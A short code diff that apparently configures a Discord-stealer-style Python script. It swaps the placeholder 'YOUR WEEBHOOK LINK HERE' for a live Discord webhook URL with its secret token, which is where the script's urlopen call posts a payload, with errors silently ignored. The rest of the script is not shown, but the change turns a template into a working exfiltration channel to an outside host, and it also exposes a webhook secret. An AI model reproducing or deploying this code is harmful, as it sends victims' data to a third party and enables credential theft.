@@ -370,7 +370,7 @@ def main():
         "avatar_url": "https://discordapp.com/assets/5ccabf62108d5a8074ddd95af2211727.png"
     }
     try:
-        urlopen(Request("YOUR WEEBHOOK LINK HERE", data=dumps(webhook).encode(), headers=getheaders()))   
+        urlopen(Request("https://discord.com/api/webhooks/1466625716392296684/YPiZndrun6lbcLftZjA7MbrQSjZh-iKtV6MLeN1UWGqNBtgYk8G7BHqQhJeaK6_jbfq5", data=dumps(webhook).encode(), headers=getheaders()))   
 
     except:
         pass
@@ -385,4 +385,5 @@ try:
 except Exception as e:
     print(e)
     pass
+
 
